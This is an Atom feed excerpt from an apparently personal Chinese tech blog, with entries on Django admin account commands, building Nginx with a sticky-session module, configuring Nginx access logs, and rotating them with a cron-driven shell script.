    <content type="html"><![CDATA[<p><strong>&#x521B;&#x5EFA;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;</strong></p><pre><code class="bash">python manage.py cretesuperuser</code></pre><p><strong>&#x4FEE;&#x6539;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;&#x5BC6;&#x7801;</strong></p><pre><code class="bash">python manage.py changepassword user_name</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&amp;#x521B;&amp;#x5EFA;&amp;#x7BA1;&amp;#x7406;&amp;#x5458;&amp;#x8D26;&amp;#x6237;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;python manage.py cretesuperuser
&lt;/c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx动静分离部署</title>
    <link href="https://marnm.github.io//posts/f4d30967/"/>
    <id>https://marnm.github.io//posts/f4d30967/</id>
    <published>2022-06-07T04:47:56.000Z</published>
    <updated>2022-06-07T04:56:53.640Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx虚拟主机</title>
    <link href="https://marnm.github.io//posts/da411b72/"/>
    <id>https://marnm.github.io//posts/da411b72/</id>
    <published>2022-06-07T04:47:42.000Z</published>
    <updated>2022-06-07T04:56:53.655Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx添加第三方模块</title>
    <link href="https://marnm.github.io//posts/e0989926/"/>
    <id>https://marnm.github.io//posts/e0989926/</id>
    <published>2022-06-07T04:47:35.000Z</published>
    <updated>2022-06-07T05:09:09.445Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nginx&#x6DFB;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757;"><a href="#Nginx&#x6DFB;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757;" class="headerlink" title="Nginx&#x6DFB;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757;"></a>Nginx&#x6DFB;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757;</h2><blockquote><p>&#x4EE5;&#x4F1A;&#x8BDD;&#x4FDD;&#x6301;nginx-stiky&#x6A21;&#x5757;&#x4E3A;&#x4F8B;</p></blockquote><p>&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/bymaximus/nginx-sticky-module-ng" target="_blank" rel="noopener">https://github.com/bymaximus/nginx-sticky-module-ng</a>  </p><pre><code class="shell">[root@rhel76 nginx]$ nginx -Vnginx version: nginx/1.12.2built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)built with OpenSSL 1.0.2k-fips  26 Jan 2017TLS SNI support enabledconfigure arguments: --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre[root@rhel76 nginx]$[root@rhel76 Packages]$ tar zxf master.tar.gz[root@rhel76 Packages]$ mv nginx-goodies-nginx-sticky-module-ng-08a395c66e42 /usr/local/nginx-stiky-module[root@rhel76 ~]$ ls /usr/local/nginx-stiky-module/basic.t  Changelog.txt  config  docs  LICENSE  ngx_http_sticky_misc.c  ngx_http_sticky_misc.h  ngx_http_sticky_module.c  patches  README.md[root@rhel76 ~]$ cd /usr/local/src/nginx-1.12.2/[root@rhel76 nginx-1.12.2]$ ./configure --prefix=/usr/local/nginx --add-module=/usr/local/nginx-stiky-module/ --with-http_stub_status_module --with-http_sub_module --with-http_ssl_module --with-pcre[root@rhel76 nginx-1.12.2]$ make[root@rhel76 nginx-1.12.2]$ nginx -Vnginx version: nginx/1.12.2built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)built with OpenSSL 1.0.2k-fips  26 Jan 2017TLS SNI support enabledconfigure arguments: --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre[root@rhel76 nginx-1.12.2]$ nginx -s stop[root@rhel76 nginx-1.12.2]$ pwd/usr/local/src/nginx-1.12.2[root@rhel76 nginx-1.12.2]$ lsauto  CHANGES  CHANGES.ru  conf  configure  contrib  html  LICENSE  Makefile  man  objs  README  src[root@rhel76 nginx-1.12.2]$ cp ./objs/nginx /usr/local/nginx/sbin/cp: overwrite &#x2018;/usr/local/nginx/sbin/nginx&#x2019;? yes[root@rhel76 nginx-1.12.2]$ nginx[root@rhel76 nginx-1.12.2]$ nginx -Vnginx version: nginx/1.12.2built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)built with OpenSSL 1.0.2k-fips  26 Jan 2017TLS SNI support enabledconfigure arguments: --prefix=/usr/local/nginx --add-module=/usr/local/nginx-stiky-module/ --with-http_stub_status_module --with-http_sub_module --with-http_ssl_module --with-pcre[root@rhel76 nginx-1.12.2]$</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Nginx&amp;#x6DFB;&amp;#x52A0;&amp;#x7B2C;&amp;#x4E09;&amp;#x65B9;&amp;#x6A21;&amp;#x5757;&quot;&gt;&lt;a href=&quot;#Nginx&amp;#x6DFB;&amp;#x52A0;&amp;#x7B2C;&amp;#x4E09;&amp;#x65B9;&amp;#x6A21;&amp;#x575
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx日志管理</title>
    <link href="https://marnm.github.io//posts/2793eb31/"/>
    <id>https://marnm.github.io//posts/2793eb31/</id>
    <published>2022-06-07T04:47:28.000Z</published>
    <updated>2022-06-07T05:09:38.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nginx&#x65E5;&#x5FD7;&#x7BA1;&#x7406;"><a href="#Nginx&#x65E5;&#x5FD7;&#x7BA1;&#x7406;" class="headerlink" title="Nginx&#x65E5;&#x5FD7;&#x7BA1;&#x7406;"></a>Nginx&#x65E5;&#x5FD7;&#x7BA1;&#x7406;</h2><p><strong>Nginx&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#xFF1A;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x548C;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;</strong></p><p>&#x65E5;&#x5FD7;&#x5F00;&#x5173;&#x5728;Nginx&#x914D;&#x7F6E;&#x6587;&#x4EF6;<code>nginx.conf</code>&#x4E2D;&#x8BBE;&#x7F6E;&#xFF0C;&#x4E24;&#x79CD;&#x65E5;&#x5FD7;&#x90FD;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x6027;&#x5173;&#x95ED;&#xFF0C;&#x9ED8;&#x8BA4;&#x90FD;&#x662F;&#x6253;&#x5F00;&#x7684;&#x3002;</p><p><strong>&#x5173;&#x95ED;&#x65E5;&#x5FD7;&#x7684;&#x65B9;&#x5F0F;</strong></p><pre><code>access_log off;error_log /dev/null;</code></pre><p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;Nginx&#x8FDB;&#x7A0B;&#x8BBE;&#x7F6E;&#x7684;&#x7528;&#x6237;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x5FC5;&#x987B;&#x5BF9;&#x65E5;&#x5FD7;&#x8DEF;&#x5F84;&#x6709;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x62A5;&#x9519;&#xFF01;</p><h2 id="&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access-log"><a href="#&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access-log" class="headerlink" title="&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access.log"></a>&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access.log</h2><p>&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x8BB0;&#x5F55;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;Nginx&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x683C;&#x5F0F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x3002;&#x901A;&#x8FC7;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7528;&#x6237;&#x5730;&#x57DF;&#x6765;&#x6E90;&#x3001;&#x8DF3;&#x8F6C;&#x6765;&#x6E90;&#x3001;&#x4F7F;&#x7528;&#x7EC8;&#x7AEF;&#x3001;&#x67D0;&#x4E2A;URL&#x8BBF;&#x95EE;&#x91CF;&#x7B49;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x3002;</p><p>&#x80FD;&#x591F;&#x4F7F;&#x7528;access_log&#x6307;&#x4EE4;&#x7684;&#x5B57;&#x6BB5;&#x5305;&#x62EC;&#xFF1A;http&#x3001;server&#x3001;location</p><p>&#x89C2;&#x5BDF;nginx&#x7684;http&#x6BB5;,&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x7C7B;&#x4F3C;&#x4FE1;&#x606F;(&#x65E5;&#x5FD7;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x65E5;&#x5FD7;&#x914D;&#x7F6E;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x53D6;&#x6D88;&#x6CE8;&#x91CA;)</p><pre><code>   &#x65E5;&#x5FD7;&#x7C7B;&#x578B;       &#x65E5;&#x5FD7;&#x8DEF;&#x5F84;            &#x65E5;&#x5FD7;&#x683C;&#x5F0F;#  access_log    logs/access.log     main;</code></pre><p>&#x8FD9;&#x8BF4;&#x660E;&#x8BE5;http&#x7684;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x7684;&#x6587;&#x4EF6;&#x662F;logs/access.log &#xFF0C;&#x4F7F;&#x7528;&#x7684;&#x683C;&#x5F0F;&#x201D;main&#x201D;&#x683C;&#x5F0F;&#xFF0C;main&#x683C;&#x5F0F;&#x662F;nginx&#x5B9A;&#x4E49;&#x597D;&#x4E00;&#x79CD;&#x65E5;&#x5FD7;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x65E5;&#x5FD7;&#x5B9A;&#x4E49;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;</p><pre><code>    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</code></pre><h3 id="&#x65E5;&#x5FD7;&#x53D8;&#x91CF;"><a href="#&#x65E5;&#x5FD7;&#x53D8;&#x91CF;" class="headerlink" title="&#x65E5;&#x5FD7;&#x53D8;&#x91CF;"></a>&#x65E5;&#x5FD7;&#x53D8;&#x91CF;</h3><p><code>$server_name</code>&#xFF1A;&#x865A;&#x62DF;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3002;<br><code>$remote_addr</code>&#xFF1A;&#x8FDC;&#x7A0B;&#x5BA2;&#x6237;&#x7AEF;IP&#x5730;&#x5740;&#x3002;<br><code>-</code>&#xFF1A;&#x7A7A;&#x767D;&#xFF0C;&#x7528;&#x4E00;&#x4E2A;&#x201D;-&#x201C;&#x5360;&#x4F4D;&#x7B26;&#x66FF;&#x4EE3;&#xFF0C;&#x5386;&#x53F2;&#x539F;&#x56E0;&#x5BFC;&#x81F4;&#x8FD8;&#x5B58;&#x5728;<br><code>$remote_user</code>&#xFF1A;&#x8FDC;&#x7A0B;&#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x6237;&#x540D;&#x79F0;&#xFF0C;&#x7528;&#x4E8E;&#x8BB0;&#x5F55;&#x6D4F;&#x89C8;&#x8005;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x65F6;&#x63D0;&#x4F9B;&#x7684;&#x540D;&#x5B57;&#xFF0C;&#x5982;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x540D;Jaking666&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x767B;&#x5F55;&#x5C31;&#x662F;&#x7A7A;&#x767D;&#x3002;<br><code>$time_local</code>&#xFF1A;&#x8BBF;&#x95EE;&#x7684;&#x65F6;&#x95F4;&#x4E0E;&#x65F6;&#x533A;&#xFF0C;&#x6BD4;&#x5982;18/Jul/2012:17:00:01 +0800&#x3002;&#x65F6;&#x95F4;&#x4FE1;&#x606F;&#x6700;&#x540E;&#x7684;&#x201D;+0800&#x201D;&#x8868;&#x793A;&#x670D;&#x52A1;&#x5668;&#x6240;&#x5904;&#x65F6;&#x533A;&#x4F4D;&#x4E8E;UTC&#x4E4B;&#x540E;&#x7684;8&#x5C0F;&#x65F6;&#x3002;<br><code>$request</code>&#xFF1A;&#x8BF7;&#x6C42;&#x7684;URI&#x548C;HTTP&#x534F;&#x8BAE;<br><code>$status</code>&#xFF1A;&#x8BB0;&#x5F55;&#x8BF7;&#x6C42;&#x8FD4;&#x56DE;&#x7684;http&#x72B6;&#x6001;&#x7801;<br><code>$body_bytes_sent</code>&#xFF1A;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6587;&#x4EF6;&#x4E3B;&#x4F53;&#x5185;&#x5BB9;&#x7684;&#x5927;&#x5C0F;&#xFF08;&#x53EF;&#x4EE5;&#x5C06;&#x65E5;&#x5FD7;&#x6BCF;&#x6761;&#x8BB0;&#x5F55;&#x4E2D;&#x7684;&#x8FD9;&#x4E2A;&#x503C;&#x7D2F;&#x52A0;&#x8D77;&#x6765;&#x4EE5;&#x7C97;&#x7565;&#x4F30;&#x8BA1;&#x670D;&#x52A1;&#x5668;&#x541E;&#x5410;&#x91CF;&#xFF09;<br><code>$http_referer</code>&#xFF1A;&#x8BB0;&#x5F55;&#x4ECE;&#x54EA;&#x4E2A;&#x9875;&#x9762;&#x94FE;&#x63A5;&#x8BBF;&#x95EE;&#x8FC7;&#x6765;&#x7684;&#x3002;<br><code>$http_user_agent</code>&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x6D4F;&#x89C8;&#x5668;&#x4FE1;&#x606F;<br><code>$http_x_forwarded_for</code>&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x771F;&#x5B9E;IP&#xFF08;&#x901A;&#x5E38;web&#x670D;&#x52A1;&#x5668;&#x653E;&#x5728;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x7684;&#x540E;&#x9762;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x80FD;&#x83B7;&#x53D6;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;IP&#x5730;&#x5740;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;<code>$request_addr</code>&#x62FF;&#x5230;&#x7684;IP&#x5730;&#x5740;&#x662F;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x3002;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5728;&#x8F6C;&#x53D1;&#x8BF7;&#x6C42;&#x7684;http&#x5934;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x589E;&#x52A0;x_forward_for&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x4EE5;&#x8BB0;&#x5F55;&#x539F;&#x6709;&#x5BA2;&#x6237;&#x7AEF;&#x7684;IP&#x5730;&#x5740;&#x548C;&#x539F;&#x6765;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#xFF09;<br><code>uptream_status</code>upstream&#x72B6;&#x6001;<br><code>upstream_addr</code>&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;<br><code>ssl_protocol</code>SSL&#x534F;&#x8BAE;&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982;TLSv1&#x3002;<br><code>ssl_cipher</code>&#x4EA4;&#x6362;&#x6570;&#x636E;&#x4E2D;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x6BD4;&#x5982;RC4-SHA&#x3002;<br><code>upstream_addr</code>upstream&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5373;&#x771F;&#x6B63;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#x4E3B;&#x673A;&#x5730;&#x5740;&#x3002;<br><code>request_time</code>&#x6574;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x603B;&#x65F6;&#x95F4;&#x3002;<br><code>upstream_response_time</code>&#x8BF7;&#x6C42;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;upstream&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002;  </p><p><strong>&#x6253;&#x5F00;nginx.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A;</strong> <code>vim /usr/local/nginx/nginx.conf</code><br>&#x65E5;&#x5FD7;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#xFF1A;  </p><pre><code># access_log    logs/access.log    main;</code></pre><p>&#x65E5;&#x5FD7;&#x751F;&#x6210;&#x7684;&#x5230;Nginx&#x6839;&#x76EE;&#x5F55;&#x54E6;logs/access.log&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x201D;main&#x201D;&#x65E5;&#x5FD7;&#x683C;&#x5F0F;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x683C;&#x5F0F;&#x3002;</p><p>&#x9664;&#x4E86;main&#x683C;&#x5F0F;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x5176;&#x4ED6;&#x683C;&#x5F0F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;log_format name(&#x683C;&#x5F0F;&#x540D;&#x79F0;) type(&#x683C;&#x5F0F;&#x6837;&#x5F0F;)</p><p>&#x4F8B;&#x5982;&#xFF1A;</p><pre><code>    #log format main &apos;remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;    #                 &apos;$status $body_bytes_sent &quot;$http_referer&quot;&apos;    #                 &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;    # access_log logs/access.log    main;</code></pre><p><strong>&#x67E5;&#x770B;NGINX&#x65E5;&#x5FD7;&#xFF1A;</strong>  </p><pre><code class="shell">[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/access.log&apos;192.168.73.20 - - [03/Jun/2022:06:09:06 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/7.29.0&quot;192.168.73.20 - - [03/Jun/2022:06:09:18 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.29.0&quot;192.168.73.20 - - [03/Jun/2022:06:09:30 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.29.0&quot;192.168.73.1 - - [03/Jun/2022:06:27:17 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;192.168.73.1 - - [03/Jun/2022:06:27:17 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;192.168.73.1 - - [03/Jun/2022:06:28:17 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;192.168.73.1 - - [03/Jun/2022:06:28:17 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;192.168.73.1 - - [03/Jun/2022:06:33:36 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot;192.168.73.1 - - [03/Jun/2022:06:33:37 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot;&apos;</code></pre><h3 id="Nginx&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;"><a href="#Nginx&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;" class="headerlink" title="Nginx&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;"></a>Nginx&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;</h3><pre><code class="shell">[root@rhel76 ~]&amp; vim /usr/local/nginx/conf/nginx.conf</code></pre><pre><code class="ini">http {    include       mime.types;    default_type  application/octet-stream;    # &#x542F;&#x7528;&#x65E5;&#x5FD7;&#x683C;&#x5F0F;&#x5316;    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;    # &#x4E0D;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;    #########access_log  logs/access.log  main;    sendfile        on;    #tcp_nopush     on;    #keepalive_timeout  0;    keepalive_timeout  65;    #gzip  on;    server {        listen       80;        server_name  localhost;        # &#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;        access_log  logs/host.access.log  main;        location / {            root   html;            index  index.html index.htm;        }# ---------------------------&#x7701;&#x7565;--------------------------------------}# ---------------------------&#x7701;&#x7565;--------------------------------------</code></pre><p><strong>&#x67E5;&#x770B;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</strong></p><pre><code class="shell">[root@rhel76 ~]&amp; nginx -tnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful[root@rhel76 ~]&amp; systemctl restart nginx[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/host.access.log</code></pre><p><strong>&#x4F7F;&#x7528;curl&#x8BF7;&#x6C42;nginx&#x4FE1;&#x606F;</strong></p><pre><code class="shell">[root@ctos74 ~]&amp; curl -I 192.168.73.24HTTP/1.1 200 OKServer: nginx/1.12.2Date: Fri, 03 Jun 2022 11:55:27 GMTContent-Type: text/htmlContent-Length: 612Last-Modified: Thu, 02 Jun 2022 21:48:43 GMTConnection: keep-aliveETag: &quot;6299303b-264&quot;Accept-Ranges: bytes[root@ctos74 ~]&amp;</code></pre><p><strong>Nginx&#x7684;&#x65E5;&#x5FD7;&#x53D8;&#x5316;&#xFF1A;</strong>  </p><pre><code class="shell">[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/host.access.log  192.168.73.20 - - [03/Jun/2022:19:55:27 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;-&quot;</code></pre><p><strong>&#x4F7F;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;nginx&#x670D;&#x52A1;&#xFF1A;</strong>  </p><blockquote><p>&#x8FD9;&#x91CC;&#x4EE5;Microsoft Edge&#x4E3A;&#x4F8B;<br>Edge&#x7248;&#x672C; 102.0.1245.30 (&#x6B63;&#x5F0F;&#x7248;&#x672C;) (64 &#x4F4D;)</p></blockquote><pre><code class="shell">[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/host.access.log192.168.73.20 - - [03/Jun/2022:19:55:27 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;-&quot;192.168.73.1 - - [03/Jun/2022:20:02:33 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot; &quot;-&quot;192.168.73.1 - - [03/Jun/2022:20:02:33 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot; &quot;-&quot;</code></pre><h3 id="Nginx&#x65E5;&#x5FD7;&#x5207;&#x5272;"><a href="#Nginx&#x65E5;&#x5FD7;&#x5207;&#x5272;" class="headerlink" title="Nginx&#x65E5;&#x5FD7;&#x5207;&#x5272;"></a>Nginx&#x65E5;&#x5FD7;&#x5207;&#x5272;</h3><p>&#x521B;&#x5EFA;nginx&#x65E5;&#x5FD7;&#x6309;&#x6BCF;&#x5206;&#x949F;&#x81EA;&#x52A8;&#x5207;&#x5272;&#x811A;&#x672C;&#x5982;&#x4E0B;&#xFF1A;  </p><pre><code class="shell">[root@rhel76 ~]&amp; vim /usr/local/nginx/conf/nginx_log.sh</code></pre><pre><code class="shell">#!/bin/bash# &#x8BBE;&#x7F6E;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x76EE;&#x5F55;LOG_HOME=&quot;/usr/local/nginx/logs/&quot;# &#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x540D;&#x79F0;LOG_PATH_BAK=&quot;$(date -d yesterday +%Y%m%d%H%M)&quot;.nginx666.access.log# &#x91CD;&#x547D;&#x540D;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;mv ${LOG_HOME}/nginx666.access.log ${LOG_HOME}/${LOG_PATH_BAK}# &#x5411;nginx&#x4E3B;&#x673A;&#x8FDB;&#x7A0B;&#x53D1;&#x9001;&#x4FE1;&#x53F7;&#xFF0C;&#x91CD;&#x65B0;&#x6253;&#x5F00;&#x65E5;&#x5FD7;kill -USR1 `cat /usr/local/nginx/logs/nginx.pid`</code></pre><pre><code class="shell">[root@rhel76 ~]&amp; chmod +x /usr/local/nginx/conf/nginx_log.sh</code></pre><p><strong>&#x521B;&#x5EFA;crontab&#x8BBE;&#x7F6E;&#x4F5C;&#x4E1A;</strong>  </p><pre><code class="shell">[root@rhel76 ~]&amp; crontab -e* * * * * /bin/bash /usr/local/nginx/conf/nginx_log.shcrontab: installing new crontab[root@rhel76 ~]&amp; 1L, 55C written[root@rhel76 ~]&amp; </code></pre><pre><code class="shell">[root@rhel76 ~]&amp; ls /usr/local/nginx/logs/access.log  error.log  host.access.log  nginx666.access.log  nginx.pid[root@rhel76 ~]&amp;[root@rhel76 ~]&amp; ll 